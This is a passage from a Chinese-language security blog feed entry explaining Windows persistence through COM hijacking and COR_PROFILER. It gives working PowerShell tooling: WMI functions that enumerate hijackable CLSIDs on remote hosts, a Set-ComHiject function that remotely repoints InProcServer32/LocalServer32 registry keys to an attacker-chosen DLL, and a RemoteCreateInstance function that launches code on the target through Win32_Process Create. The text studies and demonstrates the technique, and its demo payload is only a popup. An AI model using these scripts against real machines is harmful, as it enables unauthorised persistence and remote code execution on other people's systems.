Hijacking</a>这篇文章中，简略的介绍了如何搜寻可以被利用的COM组件。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过Persistence–COM Hijacking的描述，首先将ProcMon设定为</p><ul><li>操作是RegOpenKey</li><li>结果是NAME NOT FOUND</li><li>路径以 InprocServer32 结尾<br> <img src="http://hacky.wang/blog/20210920/Rzusce0AqME6.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，劫持一些系统组件/进程实例化的一些COM，能更好的持久化，也能增加被劫持的几率。这里我选择Explorer.EXE进程。Explorer.EXE是一个常见的系统进程，其作用是管理windows系统的相关资源，通过多次的尝试，对UI的一些操作可能是Explorer.EXE通过COM来实现的。<br>··<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过ProcMon筛选的结果，可以选择<code>{B41DB860-8EE4-11D2-9906-E49FADC173CA}</code>这个COM服务器进行劫持。可以看到注册表<code>HKCU\Software\Classes\CLSID\</code>下并不存在<code>{B41DB860-8EE4-11D2-9906-E49FADC173CA}</code>这样的键<br>  <img src="http://hacky.wang/blog/20210920/szT6x3nmagkt.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后在<code>HKCU\Software\Classes\CLSID\</code>下新建上述的CLSID，并设置InProcServer32的路径为COM注入的dll的路径，如下图。此处为了演示效果，仅仅进行一次弹窗而已。<br>  <img src="http://hacky.wang/blog/20210920/PkrmMDx4i6ws.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在下一次重启之后，便可触发COM劫持实现驻留。<br>  <img src="http://hacky.wang/blog/20210920/Wk5UNmASVDLs.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是，COM劫持的另一个大原则是不能干扰原进程的正常运行，看一个例子，同样的针对Explorer.exe进程，当我打开我的计算机的时候，可以看到先是读取了<code>HKCU\Software\Classes\CLSID\{11DBB47C-A525-400B-9E80-A54615A090C0}\InProcServer32</code>。同样的，新建一个有个CLSID键。虽然在打开我的电脑会被劫持。但是会出现这样的情况。所以这不是一个好的劫持对象。<br>   <img src="http://hacky.wang/blog/20210920/h7O0dgshVlzi.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Persistence – COM Hijacking还提到了工具acCOMplice，可以寻找缺失COM服务器的CLSID，但是在验证这个的时候发现。在部分的CLSID的LocalServer32或者InProcServer32键中可以不存在相关的值。例如<code>{00020812-0000-0000-C000-000000000046}</code>。<br>   <img src="http://hacky.wang/blog/20210920/TAbrxTd7xPlV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以使用如下的脚本遍历注册表中不存在路径的CLSID<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> Get-MissRegValue_Clsid</div><div class="line">&#123;</div><div class="line">    <span class="keyword">Param</span></div><div class="line">    (</div><div class="line">        [System.Management.Automation.PSCredential]<span class="variable">$Credential</span>,</div><div class="line">        [string]<span class="variable">$ComputerName</span>,</div><div class="line">        <span class="variable">$HK</span>,</div><div class="line">        [string]<span class="variable">$strKeyPath</span>,</div><div class="line">        [string]<span class="variable">$eachSubKey</span></div><div class="line">    )</div><div class="line">     <span class="variable">$Clsid</span> = <span class="string">""</span></div><div class="line">     <span class="comment"># 拼接路径</span></div><div class="line">     <span class="variable">$KeyPath</span> = <span class="variable">$strKeyPath</span> + <span class="string">"\"</span> + <span class="variable">$eachSubKey</span></div><div class="line">        </div><div class="line">     <span class="comment"># 此处最好是获取他的子键的名字[LocalServer32 or InprocServer32]</span></div><div class="line">     <span class="variable">$Server32Names</span> = Get-Server32Name -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span> -HK <span class="variable">$HK</span>  -strKeyPath <span class="variable">$KeyPath</span></div><div class="line">     <span class="keyword">if</span>(<span class="variable">$Server32Names</span> <span class="nomarkup">-eq</span> <span class="literal">$null</span>)</div><div class="line">     &#123;</div><div class="line">          <span class="keyword">return</span> </div><div class="line">     &#125;</div><div class="line">     <span class="keyword">ForEach</span>(<span class="variable">$Server32Name</span> <span class="keyword">in</span> <span class="variable">$Server32Names</span>)</div><div class="line">     &#123;</div><div class="line">          <span class="variable">$KeyPath2</span> = <span class="variable">$KeyPath</span> + <span class="string">"\"</span> + <span class="variable">$Server32Name</span></div><div class="line">          <span class="variable">$ValueName</span> = <span class="string">""</span></div><div class="line">         </div><div class="line">          <span class="variable">$strRegValue</span> = <span class="built_in">Invoke-WmiMethod</span> -ComputerName <span class="variable">$ComputerName</span> -Credential <span class="variable">$Credential</span> -class StdRegProv -Name GetStringValue -ArgumentList <span class="variable">$HK</span>,<span class="variable">$KeyPath2</span>,<span class="variable">$ValueName</span></div><div class="line">          <span class="keyword">if</span>(<span class="variable">$strRegValue</span>.sValue <span class="nomarkup">-eq</span> <span class="literal">$null</span>)</div><div class="line">          &#123;</div><div class="line">               <span class="variable">$Clsid</span> = <span class="variable">$eachSubKey</span></div><div class="line">               <span class="built_in">Write-Output</span> <span class="string">"Missing Value Of LocalServer32 or InprocServer32 ---&gt;$&#123;Clsid&#125;"</span></div><div class="line">          &#125;</div><div class="line">          <span class="keyword">if</span>(<span class="variable">$strRegValue</span>.sValue <span class="nomarkup">-ne</span> <span class="literal">$null</span>)</div><div class="line">          &#123;</div><div class="line">               <span class="variable">$Clsid</span> = <span class="variable">$eachSubKey</span></div><div class="line">               <span class="variable">$ComPath</span> = <span class="variable">$strRegValue</span>.sValue</div><div class="line">               <span class="built_in">Write-Host</span> <span class="string">"[*]running:$&#123;KeyPath2&#125;-----&gt;$&#123;ComPath&#125; "</span></div><div class="line">          &#125;   </div><div class="line">     &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Hunting COM 这篇文章中，展示了利用powershell实例化COM对象的例子。主要是<code>[activator]::CreateInstance([type]::GetTypeFromCLSID($Clsid))</code>进行实例化的。当修改注册表的InprocServer32的路径之后，这种COM 是很难被触发的。但是可以通过上述手动触发。<br>    <img src="http://hacky.wang/blog/20210920/tbizlxJnYyFA.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当在win7(x64)或者win10下，按照上述的操作，发现并不能进行COM劫持。并抛出HRESULT:0x800700C1的异常。通过<a href="https://stackoverflow.com/questions/50519154/net-4-0-winform-could-not-load-file-or-assembly-or-one-of-its-dependencies-i" target="_blank" rel="external">https://stackoverflow.com/questions/50519154/net-4-0-winform-could-not-load-file-or-assembly-or-one-of-its-dependencies-i</a>发现，这是由于自身编译的.dll文件是32位的，但是系统却是64位的，当编译出x64的dll之后，便可触发。<br>    <img src="http://hacky.wang/blog/20210920/Rz6XFlEt0Bg6.png?imageslim" alt="mark"></p><h3 id="0x1-3-如何利用-COM-Hiject"><a href="#0x1-3-如何利用-COM-Hiject" class="headerlink" title="0x1.3 如何利用 COM Hiject"></a>0x1.3 如何利用 COM Hiject</h3><h3 id="0x1-4-远程COM-Hiject"><a href="#0x1-4-远程COM-Hiject" class="headerlink" title="0x1.4 远程COM Hiject"></a>0x1.4 远程COM Hiject</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bohops在<a href="https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/" target="_blank" rel="external">滥用 COM 注册表结构</a>一文中，利用<code>$inproc = gwmi Win32_COMSetting | ?{ $_.LocalServer32 -ne $null }</code>来枚举可能造成文件缺失的“LocalServer32”路径，这给我以启示，可以利用Get-WmiObject等WMI方法来枚举所有的COM。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如下，是Find-MissLibraryComByGet-WmiObject可以远程获取可能被劫持的LoacalServer32和InprocServer32。利用如下WQL语句<code>Query = &quot;Select Name From CIM_DataFile Where Name = &#39;$RemoteFilePath&#39;&quot;</code>判断文件是否存在。由此可以劫持文件不存在的COM。<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> Find-MissLibraryComByGet-WmiObject</div><div class="line">&#123;</div><div class="line">    <span class="keyword">Param</span></div><div class="line">    (</div><div class="line">        [System.Management.Automation.PSCredential]<span class="variable">$Credential</span>,</div><div class="line">        [string]<span class="variable">$ComputerName</span></div><div class="line">    )</div><div class="line">    <span class="variable">$ComSetting</span> = <span class="built_in">Get-WmiObject</span> -ComputerName <span class="variable">$ComputerName</span> -Credential <span class="variable">$Credential</span> -class Win32_ComSetting</div><div class="line">    <span class="keyword">ForEach</span>(<span class="variable">$_</span> <span class="keyword">in</span> <span class="variable">$ComSetting</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="variable">$_</span>.LocalServer32 <span class="nomarkup">-ne</span> <span class="literal">$null</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="variable">$Server32</span> = <span class="variable">$_</span>.LocalServer32</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(<span class="variable">$_</span>.InprocServer32 <span class="nomarkup">-ne</span> <span class="literal">$null</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="variable">$Server32</span> = <span class="variable">$_</span>.InprocServer32</div><div class="line">        &#125;</div><div class="line">        <span class="variable">$ClSid</span> = <span class="variable">$_</span>.ComponentId       </div><div class="line">        <span class="keyword">if</span>((<span class="variable">$ClSid</span> <span class="nomarkup">-ne</span> <span class="literal">$null</span>) -and (<span class="variable">$Server32</span> <span class="nomarkup">-ne</span> <span class="literal">$null</span>))</div><div class="line">        &#123;            </div><div class="line">            <span class="comment"># 清楚路径上的多余数据</span></div><div class="line">            <span class="variable">$Server32</span> = Clear-Server32(<span class="variable">$Server32</span>)</div><div class="line">            <span class="built_in">Write-Host</span> <span class="string">"[*]running:$&#123;Clsid&#125;-----&gt;<span class="variable">$Server32</span> "</span>           </div><div class="line">            <span class="comment"># 判断文件是否存在</span></div><div class="line">            <span class="keyword">if</span>((IsRemoteFileExist -ComputerName <span class="variable">$ComputerName</span> -Credential <span class="variable">$Credential</span> -RemoteFilePath <span class="variable">$Server32</span>) <span class="nomarkup">-eq</span> <span class="literal">$False</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="built_in">Write-Output</span> <span class="string">"[!]Missing File Of LocalServer32 or InprocServer32: $&#123;Clsid&#125;---&gt;$&#123;Server32&#125;"</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在CLSID下还有一个特殊的键，名为“TreatAs”,其作为CLSID的一个软连接，当实例化一个含有TreatAs键的COM时，首先会读取原CLSID的数据，如果存在TreatAs键的时候，便读取TreatAs键的值，然后读取第二个CLSID，根据情况加载第二个CLSID的exe或者dll。<br>  <img src="http://hacky.wang/blog/20211005/3JKfkpYaFTJY.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如此的话，此时通常会有两个攻击面，第一，可以修改TreatAs的值，从而将其劫持到一个非法的CLSID。第二，可以劫持TreatAs所对应的CLSID。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当检索系统中可能存在劫持可能的CLSID之后，就可以通过修改注册表实现COM劫持。WMI也存在修改注册表的方法。WMI的StdRegProv类提供了多个读取，遍历，修改注册表数据的函数。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用 <code>GetStringValue</code>函数获取键值的值<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">$regvalue</span> = Invoke-WmiMethod -<span class="keyword">class</span> StdRegProv -Name GetStringValue -ArgumentList <span class="built_in">$HKCU</span>,<span class="built_in">$RegKey</span>,<span class="built_in">$RegName</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>CreateKey</code>函数创建键<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">$regcreatekey</span> = Invoke-WmiMethod -<span class="keyword">class</span> StdRegProv -Name CreateKey -ArgumentList <span class="built_in">$HKCU</span>,<span class="built_in">$RegKey</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>SetStringValue</code>函数设置键的值<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">$regsetvalue</span> = Invoke-WmiMethod -<span class="keyword">Class</span> StdRegProv -Name SetStringValue -ArgumentList <span class="built_in">$HKCU</span>,<span class="built_in">$RegKey</span>,<span class="built_in">$RegValue</span>,<span class="built_in">$RegName</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>EnumKey</code>检索项下面所有键<br><figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Invoke-WmiMethod -ComputerName <span class="built_in">$ComputerName</span> -Credential <span class="built_in">$Credential</span> -<span class="keyword">class</span> StdRegProv -Name EnumKey -ArgumentList <span class="built_in">$HK</span>,<span class="built_in">$strKeyPath</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如下通过远程设置注册表来COM劫持<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> Set-ComHiject</div><div class="line">&#123;</div><div class="line">    <span class="keyword">Param</span></div><div class="line">    (</div><div class="line">       [System.Management.Automation.PSCredential]<span class="variable">$Credential</span>,</div><div class="line">       [string]<span class="variable">$ComputerName</span>,</div><div class="line">       [ValidateSet(<span class="string">"HKCR"</span>,<span class="string">"HKLM"</span>,<span class="string">"HKCU"</span>)][String]<span class="variable">$RegHive</span>,</div><div class="line">       [string]<span class="variable">$Clsid</span>,</div><div class="line">       [string]<span class="variable">$HijectComPath</span></div><div class="line">    )</div><div class="line">    <span class="keyword">if</span> (<span class="variable">$RegHive</span> <span class="nomarkup">-eq</span> <span class="string">"HKCR"</span>) </div><div class="line">    &#123;</div><div class="line">        <span class="variable">$HK</span> = <span class="number">2147483648</span></div><div class="line">        <span class="variable">$KeyPath</span> =<span class="string">"CLSID"</span></div><div class="line">    &#125; </div><div class="line">    <span class="keyword">elseif</span> (<span class="variable">$RegHive</span> <span class="nomarkup">-eq</span> <span class="string">"HKLM"</span>) </div><div class="line">    &#123;</div><div class="line">        <span class="variable">$HK</span> = <span class="number">2147483650</span></div><div class="line">        <span class="variable">$KeyPath</span> = <span class="string">"SOFTWARE\Classes\CLSID"</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">elseif</span> (<span class="variable">$RegHive</span> <span class="nomarkup">-eq</span> <span class="string">"HKCU"</span>) </div><div class="line">    &#123;</div><div class="line">        <span class="variable">$HK</span> = <span class="number">2147483649</span></div><div class="line">        <span class="variable">$KeyPath</span> = <span class="string">"SOFTWARE\Classes\CLSID"</span></div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment"># 首先遍历是否存在ServerName32 一来可以判断是否存在CLSID 二来可以获取ServerName的类型</span></div><div class="line">    <span class="variable">$KeyPath2</span> = <span class="variable">$KeyPath</span> + <span class="string">"\"</span> + <span class="variable">$Clsid</span></div><div class="line">    <span class="variable">$Server32Names</span> = Get-Server32Name -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span> -HK <span class="variable">$HK</span>  -strKeyPath <span class="variable">$KeyPath2</span></div><div class="line">    <span class="keyword">if</span>(<span class="variable">$Server32Names</span> <span class="nomarkup">-ne</span> <span class="literal">$null</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(<span class="variable">$Server32Names</span>.count <span class="nomarkup">-eq</span> <span class="number">2</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="variable">$Server32Name</span> = <span class="string">"InProcServer32"</span></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>((<span class="variable">$Server32Names</span> <span class="nomarkup">-contains</span> <span class="string">"LocalServer32"</span>) <span class="nomarkup">-eq</span> <span class="literal">$True</span>) <span class="comment">#LocalServer32</span></div><div class="line">            &#123;</div><div class="line">                <span class="variable">$Server32Name</span> = <span class="string">"LocalServer32"</span></div><div class="line">            &#125;</div><div class="line">            <span class="keyword">elseif</span>((<span class="variable">$Server32Names</span> <span class="nomarkup">-contains</span> <span class="string">"InProcServer32"</span>) <span class="nomarkup">-eq</span> <span class="literal">$True</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="variable">$Server32Name</span> = <span class="string">"InProcServer32"</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="comment"># 修改注册表</span></div><div class="line">        <span class="variable">$RegKey</span> = <span class="variable">$KeyPath2</span> + <span class="string">"\"</span> + <span class="variable">$Server32Name</span></div><div class="line">        <span class="variable">$KeyValue</span>= <span class="variable">$HijectComPath</span></div><div class="line">        <span class="variable">$KeyName</span> = <span class="string">""</span></div><div class="line">        <span class="variable">$RegSetValue</span> = <span class="built_in">Invoke-WmiMethod</span>  -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span>  -Class StdRegProv -Name SetStringValue -ArgumentList <span class="variable">$HK</span>,<span class="variable">$RegKey</span>,<span class="variable">$KeyValue</span>,<span class="variable">$KeyName</span></div><div class="line">        </div><div class="line">        <span class="comment"># 检查操作结果</span></div><div class="line">        <span class="keyword">if</span>(<span class="variable">$RegSetValue</span>.ReturnValue <span class="nomarkup">-eq</span> <span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="comment"># 读取操作结果</span></div><div class="line">            <span class="variable">$RegGetValue</span> = <span class="built_in">Invoke-WmiMethod</span> -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span>  -class StdRegProv -Name GetStringValue -ArgumentList <span class="variable">$HK</span>,<span class="variable">$RegKey</span>,<span class="variable">$KeyName</span></div><div class="line">            <span class="keyword">if</span>((<span class="variable">$RegGetValue</span>.ReturnValue <span class="nomarkup">-eq</span> <span class="number">0</span>) -and (<span class="variable">$RegGetValue</span>.sValue <span class="nomarkup">-eq</span> <span class="variable">$KeyValue</span>))</div><div class="line">            &#123;</div><div class="line">                <span class="comment"># 确认是否触发</span></div><div class="line">                <span class="variable">$Flag</span> = <span class="built_in">Read-Host</span> <span class="string">"[!]whether to trigger com hijacking[Y/N]&gt;"</span></div><div class="line">                <span class="keyword">if</span>(<span class="variable">$Flag</span>.ToLower() <span class="nomarkup">-eq</span> <span class="string">"y"</span>)</div><div class="line">                &#123;</div><div class="line">                     <span class="variable">$Process</span> = RemoteCreateInstance -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span> -Clsid <span class="variable">$Clsid</span></div><div class="line">                     <span class="keyword">if</span>(<span class="variable">$Process</span> <span class="nomarkup">-ne</span> <span class="literal">$null</span>)</div><div class="line">                     &#123;</div><div class="line">                        <span class="built_in">Write-Host</span> <span class="string">"[*]maybe trigger com hijacking success"</span></div><div class="line">                     &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="variable">$Clsid</span> = <span class="variable">$KeyName</span></div><div class="line">        <span class="built_in">Write-Host</span> <span class="string">"[!]do not find $&#123;Clsid&#125;"</span></div><div class="line">    &#125;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20210921/6rFLehVCg4mc.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后一步，可能就是触发COM劫持，一般而言，实例化COM是加载CLSID的二进制文件的原因，所以在本地通常使用CreateInstance实例化CLSID,我以为可以使用<code>[activator]::CreateInstance([type]::GetTypeFromCLSID($Clsid,$ComputerName))</code>进行远程实例化，但是，实际上这是不可以的。因为这些CLSID并不是DCOM。而是普通COM，其并不具有远程实例化的能力。<br>   <img src="http://hacky.wang/blog/20210921/1lpY8WoHrekm.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以，我只能把其映射到远程计算机本地去处理，在WMImplant中，我曾经修改过其代码，以便其能远程执行代码。其原理是利用Win32_Process类的Create函数创建带参数的powershell进行远程执行代码。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">function RemoteCreateInstance</div><div class="line">&#123;</div><div class="line">     Param</div><div class="line">    (</div><div class="line">       [System<span class="selector-class">.Management</span><span class="selector-class">.Automation</span><span class="selector-class">.PSCredential</span>]<span class="variable">$Credential</span>,</div><div class="line">       [string]<span class="variable">$ComputerName</span>,</div><div class="line">       [string]<span class="variable">$Clsid</span></div><div class="line">    )</div><div class="line">    #<span class="variable">$Clsid</span> = <span class="string">"&#123;00020818-0000-0000-C000-000000000046&#125;"</span></div><div class="line">    <span class="variable">$command</span> = <span class="string">"[activator]::CreateInstance([type]::GetTypeFromCLSID('$Clsid'))"</span></div><div class="line">    #<span class="variable">$bytes</span> = [System<span class="selector-class">.Text</span><span class="selector-class">.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</div><div class="line">    #<span class="variable">$encodedCommand</span> = [Convert]::ToBase64String(<span class="variable">$bytes</span>)</div><div class="line">    <span class="variable">$remote_command</span> = <span class="string">"powershell.exe powershell -Command &#123;$command&#125;"</span></div><div class="line">    <span class="variable">$process</span> = Invoke-WmiMethod -Credential <span class="variable">$Credential</span> -ComputerName <span class="variable">$ComputerName</span> -Class Win32_Process -EnableAllPrivileges -Impersonation <span class="number">3</span> -Authentication Packetprivacy -Name Create -Argumentlist <span class="variable">$remote_command</span> </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><img src="http://hacky.wang/blog/20210921/ohNMS7W9rOIv.png?imageslim" alt="mark"><br><img src="http://hacky.wang/blog/20210921/uYsAivClAq6Y.png?imageslim" alt="mark"></p><h2 id="0x02-COR-PROFILE"><a href="#0x02-COR-PROFILE" class="headerlink" title="0x02 COR_PROFILE"></a>0x02 COR_PROFILE</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;COR_PROFILER是.NET Framework提供的一项监视或者调试CRL托管代码，这是一个.dll文件，并在运行的时候由CLR进行加载。具体技术细节可以参考微软的相关技术文章。<a href="https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview" target="_blank" rel="external">https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;COR_PROFILE通常使用环境变量注册COR_PROFILE，在.NET Framework 4之前，将COR_PROFILER设置一个CLSID，当创建.NET进程后，就会读取该CLSID下设置的COM服务器，并加载对应的二进制文件，在.NET Framework 4之后，只需要设置COR_PROFILER_PATH为需要加载dll的路径，那么就会屏蔽COR_PROFILER设置的COM。<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="attr">COR_ENABLE_PROFILING</span>=<span class="number">1</span></div><div class="line"><span class="attr">COR_PROFILER</span>=CLSID</div><div class="line"><span class="attr">COR_PROFILER_PATH</span> = dll path</div></pre></td></tr></table></figure></p><p>  <img src="http://hacky.wang/blog/20211005/K08WVetYhU3z.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为使用powershell设置环境变量，仅仅修改的是副本，也就是说，修改的环境变量会随着这次powershell进程的退出而消失。并且，通过powershell设置环境变量而注册的dll，必须设置上述三个变量才可以生效。<br>   <img src="http://hacky.wang/blog/20211005/fzQ5I6OHFkVG.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在ATT&amp;amp;CK框架中，持久性方面，攻击者使用计划任务，或者服务作为持久性的相关技术，但很少看到编号为T1546.015的COM组件劫持相关的利用。本文行文仓促，如有错误，请各位积极指正。&lt;/p&gt;
    
    </summary>
    
      <category term="安全" scheme="https://findream.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2015-2546内核提权漏洞分析</title>
    <link href="https://findream.github.io/2022/08/16/CVE-2015-2546%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/08/16/CVE-2015-2546内核提权漏洞分析/</id>
    <published>2022-08-16T06:02:11.000Z</published>
    <updated>2022-10-23T12:42:12.023Z</updated>
    
